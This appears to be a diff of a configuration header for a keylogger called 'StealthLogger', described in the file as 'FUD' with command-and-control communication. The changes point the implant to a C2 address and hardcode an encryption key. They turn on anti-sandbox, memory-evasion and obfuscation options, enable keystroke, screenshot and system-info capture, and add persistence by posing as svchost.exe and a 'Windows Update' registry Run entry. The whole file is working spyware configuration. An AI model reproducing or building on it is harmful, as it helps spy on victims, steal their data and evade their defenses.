@@ -2,28 +2,30 @@
 #define PAYLOAD_CONFIG_H
 
 // Payload configuration
-#define PAYLOAD_VERSION "1.2.0"
-#define PAYLOAD_NAME "StealthLogger"
-#define PAYLOAD_DESCRIPTION "FUD keylogger with C2 communication"
-
-// Compile-time options
-#define ENABLE_KEYLOGGER 1
-#define ENABLE_SCREENSHOT 1
-#define ENABLE_FILE_TRANSFER 1
-#define ENABLE_EVASION 1
-
-// Keylogger settings
-#define KEYLOGGER_LOG_FILE "/tmp/.system.log"
-#define KEYLOGGER_FLUSH_INTERVAL 300 // seconds
-
-// Screenshot settings
-#define SCREENSHOT_DIR "/tmp/.screenshots"
-#define SCREENSHOT_INTERVAL 600 // seconds
-
-// C2 settings
-#define C2_SERVER "c2.stealthlogger.com"
+#define PAYLOAD_VERSION "1.3.0"
+#define C2_SERVER "192.168.1.100"
 #define C2_PORT 443
-#define C2_RECONNECT_INTERVAL 60 // seconds
-#define C2_HEARTBEAT_INTERVAL 300 // seconds
+#define ENCRYPTION_KEY "S3cr3tK3y"
+
+// Persistence settings
+#define PERSISTENCE_ENABLED 1
+#define PERSISTENCE_DELAY 60000  // 60 seconds
+
+// Evasion techniques
+#define ANTI_SANDBOX_ENABLED 1
+#define MEMORY_EVASION_ENABLED 1
+#define STRING_OBFUSCATION_ENABLED 1
+
+// Data collection settings
+#define KEYLOGGER_ENABLED 1
+#define SCREENSHOT_ENABLED 1
+#define SYSTEM_INFO_ENABLED 1
+
+// New persistence configuration
+#define TARGET_EXECUTABLE_NAME "svchost.exe"
+#define PROGRAM_DATA_PATH "C:\\ProgramData\\"
+#define VBS_SCRIPT_NAME "update.vbs"
+#define REGISTRY_RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define REGISTRY_VALUE_NAME "Windows Update"
 
 #endif // PAYLOAD_CONFIG_H
